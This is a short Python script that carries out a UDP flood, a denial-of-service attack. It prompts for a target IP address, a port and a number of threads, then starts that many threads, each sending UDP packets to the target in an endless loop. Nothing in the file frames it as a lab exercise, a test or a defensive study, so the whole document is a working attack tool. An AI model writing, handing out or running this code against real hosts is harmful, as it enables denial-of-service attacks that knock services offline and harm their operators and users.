import socket
import threading

def flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"UDP flood payload", (target_ip, target_port))

def main():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    num_threads = int(input("Enter number of threads: "))

    for _ in range(num_threads):
        threading.Thread(target=flood, args=(target_ip, target_port)).start()

if __name__ == "__main__":
    main()